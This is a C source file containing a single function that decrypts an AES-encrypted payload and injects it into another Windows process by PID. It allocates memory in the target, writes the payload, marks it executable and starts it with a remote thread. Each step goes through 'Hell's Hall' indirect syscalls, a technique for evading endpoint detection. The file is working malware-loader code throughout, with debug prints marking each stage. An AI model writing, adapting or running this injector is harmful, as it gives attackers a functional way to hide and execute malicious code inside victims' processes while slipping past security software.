#include "hall.h"
#include "structs.h"
#include "helpers.h"

//----------------[inject]--------------------------------------------------//

int inject_module(IN DWORD targetPid, IN const char* encryptedContent) {
    printf("[*] Starting inject_module\n");
    printf("[*] Attempting to initialize Hell's Hall\n");
    
    if (!Initialize()) {
        printf("[!] Failed to initialize Hell's Hall\n");
        return -1;
    }

    printf("[+] Hell's Hall initialized successfully\n");

    char debugMsg[512];
    snprintf(debugMsg, sizeof(debugMsg), "[*] Starting injection into PID: %lu", targetPid);
    printf("%s\n", debugMsg);
    
    snprintf(debugMsg, sizeof(debugMsg), "[*] Encrypted content length: %zu", 
             encryptedContent ? strlen(encryptedContent) : 0);
    printf("%s\n", debugMsg);

    HANDLE hTargetProcess = NULL;
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
    CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)targetPid, NULL };

    PBYTE pDecryptedData = NULL;
    SIZE_T sDecryptedData = 0;

    if (encryptedContent != NULL && strlen(encryptedContent) > 0) {
        printf("[*] Attempting AES decryption\n");
        if (!aesDecryptionHelper(encryptedContent, &pDecryptedData, &sDecryptedData)) {
            printf("[!] AES Decryption Failed\n");
            return -1;
        }
        snprintf(debugMsg, sizeof(debugMsg), "[+] AES Decryption Succeeded, Decrypted Size: %zu bytes", sDecryptedData);
        printf("%s\n", debugMsg);
    } else {
        printf("[!] No encrypted content provided or content is empty\n");
        return -1;
    }

    printf("[*] Opening target process\n");
    SYSCALL(S.NtOpenProcess);
    NTSTATUS STATUS = HellHall(&hTargetProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (STATUS != 0x0) {
        snprintf(debugMsg, sizeof(debugMsg), "[!] NtOpenProcess Failed With Status : 0x%0.8X", STATUS);
        printf("%s\n", debugMsg);
        return -1;
    }

    printf("[+] Target process opened successfully\n");

    PVOID pAddress = NULL;
    SIZE_T dwSize = sDecryptedData;
    ULONG dwOld = 0;

    printf("[*] Allocating memory in target process\n");
    SYSCALL(S.NtAllocateVirtualMemory);
    if ((STATUS = HellHall(hTargetProcess, &pAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0) {
        snprintf(debugMsg, sizeof(debugMsg), "[!] NtAllocateVirtualMemory Failed With Status : 0x%0.8X", STATUS);
        printf("%s\n", debugMsg);
        CloseHandle(hTargetProcess);
        return -1;
    }

    snprintf(debugMsg, sizeof(debugMsg), "[+] Allocated memory at address: %p, size: %zu", pAddress, dwSize);
    printf("%s\n", debugMsg);

    printf("[*] Writing payload to target process\n");
    SIZE_T bytesWritten = 0;
    SYSCALL(S.NtWriteVirtualMemory);
    if ((STATUS = HellHall(hTargetProcess, pAddress, pDecryptedData, sDecryptedData, &bytesWritten)) != 0x0) {
        snprintf(debugMsg, sizeof(debugMsg), "[!] NtWriteVirtualMemory Failed With Status : 0x%0.8X", STATUS);
        printf("%s\n", debugMsg);
        CloseHandle(hTargetProcess);
        return -1;
    }

    snprintf(debugMsg, sizeof(debugMsg), "[+] Wrote %zu bytes to target process", bytesWritten);
    printf("%s\n", debugMsg);

    printf("[*] Changing memory protection\n");
    SIZE_T protectSize = sDecryptedData;
    SYSCALL(S.NtProtectVirtualMemory);
    if ((STATUS = HellHall(hTargetProcess, &pAddress, &protectSize, PAGE_EXECUTE_READ, &dwOld)) != 0x0) {
        snprintf(debugMsg, sizeof(debugMsg), "[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X", STATUS);
        printf("%s\n", debugMsg);
        CloseHandle(hTargetProcess);
        return -1;
    }

    printf("[+] Memory protection changed to PAGE_EXECUTE_READ\n");

    printf("[*] Creating remote thread\n");
    OBJECT_ATTRIBUTES threadObjAttr = { sizeof(OBJECT_ATTRIBUTES) };
    SYSCALL(S.NtCreateThreadEx);
    if ((STATUS = HellHall(&hThread, 0x1FFFFF, &threadObjAttr, hTargetProcess, pAddress, NULL, 0, 0, 0, 0, NULL)) != 0x0) { 
        snprintf(debugMsg, sizeof(debugMsg), "[!] NtCreateThreadEx Failed With Status : 0x%0.8X", STATUS);
        printf("%s\n", debugMsg);
        CloseHandle(hTargetProcess);
        return -1;
    }

    printf("[*] SYSCALLS SUCCESS\n");
    printf("[+] Thread created successfully in target process\n");

    if (hTargetProcess != NULL) {
        CloseHandle(hTargetProcess);
    }
    if (hThread != NULL) {
        CloseHandle(hThread);
    }
    
    if (pDecryptedData != NULL) {
        safe_free(pDecryptedData);
    }
    
    printf("[+] Module execution completed successfully\n");
    return 0;
}